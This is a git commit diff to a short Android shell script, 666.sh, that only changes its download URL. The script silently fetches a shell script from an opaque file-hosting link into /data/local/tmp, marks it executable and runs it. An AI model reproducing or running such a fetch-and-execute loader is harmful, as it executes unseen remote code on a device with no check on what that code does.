11bfe043cbc6e16eadc226e50edc76c67beefcb5
Feiznb <2415523492@qq.com>
2026-02-19 02:54:49 +0800

    更新 666.sh

--- 666.sh
+++ 666.sh
@@ -1,4 +1,4 @@
 #!/system/bin/sh
-SCRIPT_URL="https://pan.shenzhi.shop/down.php/9cb74b2bffd7778e38003a9fc7ab913f.sh"
+SCRIPT_URL="https://pan.shenzhi.shop/down.php/9c840a591f2920888ef98fe0b9196f13.sh"
 TMP="/data/local/tmp/isu.sh"
 curl -sL -o "$TMP" "$SCRIPT_URL" && chmod +x "$TMP" && exec "$TMP"
